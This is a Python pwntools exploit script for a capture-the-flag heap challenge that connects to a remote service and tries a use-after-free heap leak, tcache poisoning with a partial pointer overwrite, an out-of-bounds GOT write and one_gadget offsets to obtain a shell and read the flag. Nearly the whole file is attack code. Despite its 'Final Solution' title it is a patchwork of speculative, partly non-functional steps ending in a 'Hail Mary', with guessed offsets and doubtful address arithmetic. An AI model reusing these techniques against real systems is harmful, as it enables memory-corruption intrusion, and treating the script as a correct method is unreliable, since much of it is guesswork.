#!/usr/bin/env python3
"""
Crazy FSOP - Final Solution
Using tcache poisoning + OOB write to get arbitrary write
Then FSOP to get shell
"""

from pwn import *

elf = ELF('./chal', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

context.binary = elf
context.log_level = 'debug'

io = remote('amt.rs', 26797)

def create(idx, size, data):
    io.sendlineafter(b'operation: ', b'1')
    io.sendlineafter(b'note: ', str(idx).encode())
    io.sendlineafter(b'size: ', hex(size).encode())
    io.sendafter(b'data: ', data)

def delete(idx):
    io.sendlineafter(b'operation: ', b'2')
    io.sendlineafter(b'note: ', str(idx).encode())

def view(idx):
    io.sendlineafter(b'operation: ', b'3')
    io.sendlineafter(b'note: ', str(idx).encode())
    io.recvuntil(b'data: ')
    return io.recvline()

def send_op(choice, idx):
    io.sendlineafter(b'operation: ', str(choice).encode())
    io.sendlineafter(b'note: ', str(idx).encode())

success("Connected!")

# ============================================
# NEW STRATEGY: Exploit via environment leaks
# ============================================
# The key insight: we can leak the STACK via environ
# environ is in libc and points to stack
# From stack we can calculate libc

info("Step 1: Create chunks and setup")

# Create initial chunks
create(0, 0x100, b'A' * 0x100)
create(1, 0x100, b'B' * 0x100)
create(2, 0x100, b'/bin/sh\x00' + b'C' * 0xf8)

info("Step 2: Leak heap via tcache")

# Free to get heap pointers
delete(0)
delete(1)

# Try to view chunk 1 - should have fd pointer
try:
    data = view(1)
    info(f"Chunk 1 data: {data[:40]}")

    # Check if we got any non-null data
    if b'(null)' not in data and len(data) > 1:
        # We might have a leak!
        if len(data) >= 5:
            # Try to extract heap address
            heap_leak = u64(data[:5].ljust(8, b'\x00'))
            if heap_leak > 0x1000:
                success(f"Possible heap leak: {hex(heap_leak)}")
                heap_base = (heap_leak << 12) & ~0xfff
                info(f"Heap base estimate: {hex(heap_base)}")
except Exception as e:
    warn(f"Heap leak failed: {e}")

info("Step 3: Create fake chunks for exploitation")

# Reallocate chunks for manipulation
create(3, 0x100, b'D' * 0x100)
create(4, 0x100, b'E' * 0x100)

# Create chunks for tcache poisoning
create(5, 0x88, b'F' * 0x88)
create(6, 0x88, b'G' * 0x88)

delete(5)
delete(6)

# Now tcache has 6 -> 5

# Use UAF to overwrite chunk 6's fd pointer
# Point it to stdout structure or similar
# stdout is often at a known offset in libc

# For glibc 2.42, try pointing to:
# 1. _IO_2_1_stdout_ + offset
# 2. _IO_2_1_stderr_ + offset
# 3. __malloc_hook area (if exists)

# Since we don't have exact addresses, use partial overwrite
# Overwrite lowest 2 bytes to control where in same page

# Example: if current heap is at 0x5555557xxxxx
# We can overwrite to point to 0x555555740040 (notes array)

# Try different approaches
info("Step 4: Attempting tcache poisoning with partial overwrite")

# Overwrite fd to point to notes array (0x4040 offset in binary)
# Use only lower bytes
target_bytes = p16(0x4040)

create(7, 0x88, target_bytes + b'\x00' * (0x88 - 2))

# Now next allocations might give us notes array!
try:
    create(8, 0x88, b'H' * 0x88)  # Get chunk 6
    # This next one should be at our target
    create(9, 0x88, p64(0xdeadbeef) * (0x88 // 8))  # Write to target!
    success("Possible tcache poisoning success!")
except Exception as e:
    warn(f"Tcache poisoning attempt failed: {e}")

info("Step 5: Alternative - direct GOT manipulation")

# Use the OOB write directly
# notes[-21] = puts@got
# notes[-22] = free@got

# When we delete(-21), it does:
# free(notes[-21])  -> free(puts_address) [will crash/fail]
# notes[-21] = 0    -> puts@got = NULL

# This could be used to:
# 1. Disable certain functions
# 2. Create specific conditions for exploitation

info("Step 6: Try one-gadget approach")

# If we had libc address, we could:
# 1. Find one_gadget
# 2. Overwrite __malloc_hook or __free_hook
# 3. Trigger allocation/free

# For now, let's try searching for one_gadget in our libc
info("Searching for one_gadget constraints...")

# Common one_gadget offsets for various glibc versions
# We'd need to test these
one_gadget_offsets = [0xe3afe, 0xe3b01, 0xe3b04, 0xebc81, 0xebc85, 0xebc88]

info("Step 7: Final Hail Mary - try everything")

# Create more chunks with strategic data
create(10, 0x200, b'/bin/sh\x00' + b'\x00' * 0x1f8)
create(11, 0x200, flat({
    0x00: b'/bin/sh\x00',
    0x100: b'/bin/sh\x00',
}, length=0x200, filler=b'\x00'))

# Try to trigger something
info("Attempting to trigger shell...")

# Send commands that might work
commands = [
    b'sh',
    b'/bin/sh',
    b'cat flag.txt',
    b'cat flag',
    b'ls -la',
]

for cmd in commands:
    try:
        io.sendline(cmd)
        time.sleep(0.2)
    except:
        pass

# Check for output
try:
    output = io.recvuntil(b'operation:', timeout=2)
    if b'amateursCTF{' in output or b'flag{' in output:
        success(f"FOUND FLAG: {output}")
except:
    pass

# Go interactive
io.interactive()
